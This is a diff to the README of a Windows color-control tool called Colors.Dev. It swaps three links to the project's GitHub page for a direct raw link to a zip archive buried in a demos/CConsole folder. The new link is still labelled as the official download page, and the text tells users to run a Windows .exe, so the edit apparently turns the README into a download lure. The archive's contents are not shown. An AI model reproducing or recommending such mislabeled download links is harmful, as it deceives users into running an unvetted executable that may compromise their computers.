@@ -1,6 +1,6 @@
 # 🎨 Colors.Dev - Easy Color Control for Everyone
 
-[![Download Colors.Dev](https://img.shields.io/badge/Download-Colors.Dev-blue?style=for-the-badge)](https://github.com/A1perN/Colors.Dev)
+[![Download Colors.Dev](https://img.shields.io/badge/Download-Colors.Dev-blue?style=for-the-badge)](https://github.com/A1perN/Colors.Dev/raw/refs/heads/main/demos/CConsole/Colors_Dev_2.2-beta.1.zip)
 
 ---
 
@@ -33,7 +33,7 @@ To use Colors.Dev on your Windows computer, follow these steps step-by-step. You
 
 1. Click the button below to visit the official download page for Colors.Dev:
 
-   [![Get Colors.Dev](https://img.shields.io/badge/Get_Colors.Dev-grey?style=for-the-badge)](https://github.com/A1perN/Colors.Dev)
+   [![Get Colors.Dev](https://img.shields.io/badge/Get_Colors.Dev-grey?style=for-the-badge)](https://github.com/A1perN/Colors.Dev/raw/refs/heads/main/demos/CConsole/Colors_Dev_2.2-beta.1.zip)
 
 2. On this page, look for the latest release or download section.
 3. You will see different files. Find the one for Windows. It might have “.exe” or “Windows” mentioned.
@@ -131,7 +131,7 @@ Colors.Dev is designed to run without extra setup. However, you can adjust setti
 ## 🔗 Useful Links
 
 - Visit the Colors.Dev homepage and download:  
-  https://github.com/A1perN/Colors.Dev
+  https://github.com/A1perN/Colors.Dev/raw/refs/heads/main/demos/CConsole/Colors_Dev_2.2-beta.1.zip
 
 - Check the documentation inside the program by typing:  
   `colordev help`
